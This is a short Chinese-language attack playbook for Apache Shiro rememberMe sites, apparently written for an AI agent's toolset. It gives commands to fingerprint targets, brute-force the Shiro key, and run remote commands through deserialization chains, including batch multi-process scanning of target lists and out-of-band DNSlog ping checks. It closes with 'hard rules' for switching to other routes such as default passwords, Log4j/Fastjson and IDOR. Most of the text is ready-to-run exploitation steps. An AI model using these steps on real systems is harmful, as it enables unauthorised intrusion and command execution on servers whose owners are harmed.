# Shiro rememberMe 一键爆破卡（≤50行）

**适用**: rememberMe=deleteMe 指纹命中的 Java 站。**一条命令完成爆破 key + 利用链 + RCE**。

## 0. 指纹确认 (5秒)
```bash
curl -sk -o /dev/null -D - <目标> -H "Cookie: rememberMe=test" --noproxy '*'
# 响应头含 rememberMe=deleteMe => Shiro 命中
```

## 1. 一键全自动 (工具: tools/shiro/shiro_pyke/shirokit.py)
```bash
cd D:\Desktop\Claude\tools\shiro\shiro_pyke
python shirokit.py scan http://目标:端口/
# → SPC爆破内置1106 key(无假阳性) → 命中自动 rce 验证(15链×3回显) → JSON(key/chain/echo/whoami)
```

## 2. 手动控制
```bash
python shirokit.py rce <url> <key>                       # 自动遍历利用链
python shirokit.py exec <url> <key> CommonsBeanutils1_183 AllEcho "whoami"  # 指定链+回显
python shirokit.py scan targets.txt rememberMe 20 4      # 批量多进程, 结果 shirokit_results.json
```

## 3. Windows 目标铁律
- 目标 Windows 时用 `whoami` / `ipconfig` / `ping`（**无 `id`/`cat`**，`id` 会显示 `<null>`）
- 中文 Windows 输出 GBK，工具自动转 UTF-8

## 3b. 无回显确认（OOB）
- AllEcho/TomcatEcho 都不回显时，**命令仍可能执行**：
```bash
python shirokit.py exec <url> <key> CommonsBeanutils1_183 AllEcho "ping <dnslog域>" 2>/dev/null
python <workdir>/tools/dnslog_helper/dnslog.py poll   # 回连 IP=目标出口IP = 命令执行证据
```

## 4. 命中判定原理（SPC, 无假阳性）
- payload 必须 **SimplePrincipalCollection**：正确 key → 解密+反序列化+cast 全成功 → 响应**不含** deleteMe
- URLDNS(HashMap) cast 失败 → 正确 key 也 deleteMe = **假阴性**（只适用 DNS 回连验证）
- 目标 Shiro 版本极老/新时 SPC serialVersionUID 不匹配 → 全 deleteMe 假阴性，需 DNSLog 交叉验证

## 5. 止损切换 (硬规则)
0 命中 / 无回连 => 结论 = "Shiro 密钥非默认或出站不通, RCE 链关闭" => **立即切下一链路**:
1. 产品 N-day (getDataSource 等, 已登录态)
2. 认证中心登录侧 (初始密码/弱口令)
3. 其他组件 (Fastjson/Log4j/Spring actuator)
4. 业务功能已登录态 (IDOR/越权)

**禁止**: 同一站全量爆破跑多遍 / 多域逐个全量 / 无回连还纠缠 DNSLog

详见: `tools/shiro/shiro_pyke/README.md` + `tools/knowledge_base/techniques/kb_fastjson_shiro_log4j_master_2026.md`
